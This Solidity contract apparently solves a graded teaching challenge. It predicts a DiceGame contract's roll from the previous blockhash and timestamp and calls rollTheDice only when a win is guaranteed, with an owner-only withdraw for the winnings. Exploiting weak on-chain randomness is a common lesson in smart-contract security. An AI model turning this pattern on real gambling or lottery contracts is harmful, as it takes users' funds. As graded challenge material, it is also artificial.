pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address recipient, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient funds");
        require(recipient != address(0), "Invalid recipient address");
        // Transfer the specified amount to the recipient
        payable(recipient).transfer(amount);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Not enough ETH to roll");

        // Predict the roll using the same logic as DiceGame
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 predictedRoll = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, address(this)))) % 16 + 1;

        console.log("Predicted roll: %s", predictedRoll);

        if (predictedRoll <= 3) {
            // Only roll if we predict a win
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            console.log("Not a winning roll, skipping...");
        }
    }
    
    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
